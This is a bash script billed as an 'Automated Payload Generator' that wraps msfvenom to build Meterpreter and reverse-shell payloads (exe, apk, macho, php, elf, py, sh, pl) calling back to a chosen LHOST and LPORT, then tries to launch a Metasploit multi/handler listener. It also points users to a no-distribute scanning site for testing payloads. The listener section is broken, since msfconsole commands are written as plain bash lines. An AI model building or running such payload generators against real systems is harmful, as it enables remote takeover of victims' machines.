#!/bin/bash
 

#lOGO==========================================================================================
echo "                "
echo "                "
echo "                "


echo -e "\e[1;36m           ███╗   ███╗████████╗██╗    ██╗██████╗  ██████╗  \e[0m "
echo -e "\e[1;36m           ████╗ ████║╚══██╔══╝██║    ██║██╔══██╗██╔════╝  \e[0m "
echo -e "\e[1;36m           ██╔████╔██║   ██║   ██║ █╗ ██║██████╔╝██║  ███╗ \e[0m"
echo -e "\e[1;36m           ██║╚██╔╝██║   ██║   ██║███╗██║██╔═══╝ ██║   ██║ \e[0m"
echo -e "\e[1;36m           ██║ ╚═╝ ██║   ██║   ╚███╔███╔╝██║     ╚██████╔╝ \e[0m"
echo -e "\e[1;36m           ╚═╝     ╚═╝   ╚═╝    ╚══╝╚══╝ ╚═╝      ╚═════╝  \e[0m"
echo -e "\e[1;33m             Automated Payload Generator by MTW ABBAXI    \e[0m  "


echo "                "
echo "                "
echo "                "

#AUTHOR INFORMATION==============================================================================


echo -e                "   \e[1;36m                                        AUTHOR INFORMATION                         " 
echo -e "                  \e[1;33m =================================================================     \e[0m  "
echo -e "                 \e[1;32m |                     SCRIPT BY MTW ABBAXI                        |      \e[0m  "
echo -e "                 \e[1;24m |                                                                 |      \e[0m  "
echo -e "                  \e[1;33m|       Website  : http://www.mtwabbaxi.tk/                       |      \e[0m  "
echo -e "                  \e[1;33m|       Facebook : https://www.facebook.com/mtwethicalhacker      |      \e[0m  "
echo -e "                  \e[1;33m|       Github   : https://github.com/mtwabbaxi                   |      \e[0m  "
echo -e "                  \e[1;33m|       Author   : MUHAMMAD TALHA WASEEM                          |      \e[0m  "
echo -e "                  \e[1;33m =================================================================     \e[0m  "

echo "                "
echo "                "
echo "                "

#MENU=============================================================================================

echo -e "\e[1;36m ========================= \e[0m"
echo -e "\e[1;36m ENTER ONE OF THESE BELOW  \e[0m"
echo -e "\e[1;36m ========================= \e[0m"
echo "                "

echo " 1. Windows "
echo " 2. Andriod "
echo " 3. Mac     "
echo " 4. Php Shell   "
echo " 5. Linux   "
echo " 6. Python   "
echo " 7. Bash   "
echo " 8. Perl   "

echo "                "
echo "                "

read -p "Choose Number: " num
echo    "                   "
if [[ $num == 1 ]]
    then 
    echo -e "\e[1;32m       Ok I Got it. Payload is For \e[1;33m Windows \e[0m"
elif [[ $num == 2 ]]
    then
    echo -e "\e[1;32m       Ok I Got it. Payload is For \e[1;33m Andriod \e[0m"
elif [[ $num == 3 ]]
    then
    echo -e "\e[1;32m       Ok I Got it. Payload is For \e[1;33m Mac \e[0m"
elif [[ $num == 4 ]]
    then
    echo -e "\e[1;32m       Ok I Got it. Payload is For \e[1;33m Php Shell \e[0m"
elif [[ $num == 5 ]]
    then
    echo -e "\e[1;32m       Ok I Got it. Payload is For \e[1;33m Linux \e[0m"
elif [[ $num == 6 ]]
    then
    echo -e "\e[1;32m       Ok I Got it. Payload is For \e[1;33m Python \e[0m"
elif [[ $num == 7 ]]
    then
    echo -e "\e[1;32m       Ok I Got it. Payload is For \e[1;33m Bash \e[0m"
elif [[ $num == 8 ]]
    then
    echo -e "\e[1;32m       Ok I Got it. Payload is For \e[1;33m Perl \e[0m"
else
    echo -e "\e[1;32m       Wrong Entry ,\e[1;33m Please Check it Again..!!! \e[0m"
fi
echo "                "
read -p "Enter LHOST (Check ==> ifconfig ): " lhost
echo    "                   "
echo -e "\e[1;32m       LHOST is Set to be \e[1;33m $lhost \e[0m"
echo    "                   "
read -p "Enter LPORT (rec: 4444): " lport
echo    "                   "
echo -e "\e[1;32m       LPORT is Set to be \e[1;33m $lport \e[0m"
echo    "                   "
read -p "Enter NAME of File (Without Extension): " name
echo    "                   "
echo -e "\e[1;32m       NAME is Set to be \e[1;33m $name \e[0m"
echo    "                   "
echo    "                   "

echo -e " \e[1;36m                 		              ========================      \e[0m           "
echo -e " \e[1;36m		           		            Please Wait                     \e[0m     "
echo -e " \e[1;36m        		                      ========================      \e[0m            "
echo "                "
echo "                "

#COMMANDS=================================================================================

if [[ $num == 1 ]]
	then 
    msfvenom -p windows/meterpreter/reverse_tcp lhost=$lhost lport=$lport  > /root/Desktop/$name.exe
elif [[ $num == 2 ]]
	then
    msfvenom -p andriod/meterpreter/reverse_tcp lhost=$lhost lport=$lport  > /root/Desktop/$name.apk
elif [[ $num == 3 ]]
	then
    msfvenom -p osx/x86/meterpreter/reverse_tcp lhost=$lhost lport=$lport  > /root/Desktop/$name.macho
elif [[ $num == 4 ]]
	then
    msfvenom -p php/meterpreter/reverse_tcp lhost=$lhost lport=$lport  > /root/Desktop/$name.php
elif [[ $num == 5 ]]
	then
    msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=$lhost lport=$lport  > /root/Desktop/$name.elf
elif [[ $num == 6 ]]
	then
    msfvenom -p cmd/unix/reverse_python lhost=$lhost lport=$lport  > /root/Desktop/$name.py
elif [[ $num == 7 ]]
	then
    msfvenom -p cmd/unix/reverse_bash lhost=$lhost lport=$lport  > /root/Desktop/$name.sh
elif [[ $num == 8 ]]
	then
    msfvenom -p cmd/unix/reverse_perl lhost=$lhost lport=$lport  > /root/Desktop/$name.pl
fi
echo "                "
echo "                "

echo -e "\e[1;34m      Payload Created..!!! \e[0m"
echo "                "

#Console====================================================================================
read -p " Are You Sure You Want to Open the Console (y/n):  " ans
if [[ $ans == y ]]
    then
    echo "                "
    read -p "Payload Type (e.g : windows/meterpreter/reverse_tcp) : " payload
    echo "                "
    echo -e "\e[1;32m       Ok. Wait for a \e[1;33m Minute \e[0m"
    echo "                "
    msfconsole
    use exploit/multi/handler
    set payload $payload
    set lhost $lhost
    set lport $lport
    exploit
elif [[ $ans == Y ]]
    then
    echo "                "
    read -p "Payload Type (e.g : windows/meterpreter/reverse_tcp) : " payload
    echo "                "
    echo -e "\e[1;32m       Ok. Wait for a \e[1;33m Minute \e[0m"
    echo "                "
    msfconsole
    use exploit/multi/handler
    set payload $payload
    set lhost $lhost
    set lport $lport
    exploit

elif [[ $ans == n ]]
    then
    echo "                "
    echo -e "\e[1;33m OK.Please Check this path for Payload >> /root/Desktop/$name \e[0m"
    echo -e "\e[1;32m HAPPY HACKING , GOOD BYE...!!! \e[0m  "
    exit
elif [[ $ans == N ]]
    then
    echo "                "
    echo -e "\e[1;33m OK.Please Check this path for Payload >> /root/Desktop/ \e[0m"
    echo -e "\e[1;32m HAPPY HACKING , GOOD BYE...!!! \e[0m  "
    exit
else
    echo "                "
    echo -e " ==> \e[1;33m Wrong Entering \e[0m"

fi

#ENDING=====================================================================================

echo "                "
echo "                "
echo -e "\e[1;36m Succesfully Done..!!! \e[0m"
echo    "                                    "
echo -e "\e[1;33m Please Check this path >> /root/Desktop/ \e[0m"
echo    "                                    "
echo -e "\e[1;31m Check this on : \e[1;32m www.No-Distribute.com \e[0m  "
echo    "                                    "
echo -e "\e[1;24m HAPPY HACKING , GOOD BYE...!!! \e[0m  "


#Coloring Code

#echo -e  " \e[1;33m Content \e[0m "    ==> Yellow
#echo -e  " \e[1;36m Content \e[0m "    ==> Blue